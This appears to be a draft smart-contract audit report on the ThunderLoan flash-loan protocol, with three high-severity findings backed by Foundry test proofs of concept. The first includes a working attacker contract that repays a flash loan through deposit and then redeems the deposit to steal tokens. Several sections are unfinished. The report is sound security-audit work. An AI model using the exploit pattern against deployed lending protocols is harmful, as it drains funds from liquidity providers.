### [H-#] Can Stole tokens by calling deposit instead of repay or direct transfer when flash loaninng

**Description:**

**Impact:**

**Proof of Concept:**

```solidity
    function testDepositOverReplay() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fees = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fees);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();
        assertGe(tokenA.balanceOf(address(dor)), amountToBorrow + fees);
        // 50.15718582989109e18 stolen money
        // 50.15e18 amountToBorrow + fees
        console.log("amountToBorrow + fees", (amountToBorrow + fees));
    }

/*//////////////////////////////////////////////////////////////
                             TEST-CONTRACTS
    //////////////////////////////////////////////////////////////*/

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address s_token;
    AssetToken assetToken;

    constructor(address _thunderloan) {
        thunderLoan = ThunderLoan(_thunderloan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        s_token = token;
        IERC20(s_token).approve(address(thunderLoan), 1000e19);
        thunderLoan.deposit(IERC20(token), amount + fee);
    }

    function redeemMoney() public {
        assetToken = thunderLoan.getAssetFromToken(IERC20(s_token));
        uint256 assetTokenAmount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(IERC20(s_token), assetTokenAmount);
        // console.log(assetTokenAmount);
    }
}
```

**Recommended Mitigation:**
add mutex lock when flashloaning??
################

### [H-#] Erorneous function `ThunderLoan::deposit` has `updateExchangeRate` function call which blocks redeem function and protocol thinks it has more funds that it is and update exchange rate to wrong value

**Description:**
updateExchangerate called by not fees collected
**Impact:**

1. block reddem
2. incorrect rate
   **Proof of Concept:**

```solidity
    function testRedeemAfterFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        vm.startPrank(liquidityProvider);
        uint256 redeemAmountByLiq = type(uint256).max;
        thunderLoan.redeem(tokenA, redeemAmountByLiq);
        // redeem amount 1003300900000000000000 1003e18
        // deposited amount  //1000e18
        //fee 0.3e18
        //amount expected to reddem => 1000.3e18; but get 1003e18
        vm.stopPrank();
    }
```

**Recommended Mitigation:**

```diff

 function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
-         uint256 calculatedFee = getCalculatedFee(token, amount);
        // @audit-high shouldnt updateRate here
-  assetToken.updateExchangeRate(calculatedFee);
        // e underlying tokens are transferd to assettoken contract
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

##############

### [H-#] storage collion makes upgraded fee way higher(Root Cause -> Impact)

**Description:**
```
----------------|
| s_flashLoanFee          | uint256                                         | 2    | 0      | 32    | src/upgradedProtocol/ThunderLoanUpgraded.sol:ThunderLoanUpgraded |
|----------------
```
**Impact:**
s_currentlyFlashLoaning also affected
**Proof of Concept:**

```solidity
  function testStorageCollion() public {
        vm.startPrank(thunderLoan.owner());
        uint256 originalValue = thunderLoan.getFee();
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 afterUpgradeValue = thunderLoan.getFee();
        vm.stopPrank();
        console.log("originalValue", originalValue);
        console.log("afterUpgradeValue", afterUpgradeValue);
    }
```

**Recommended Mitigation:**
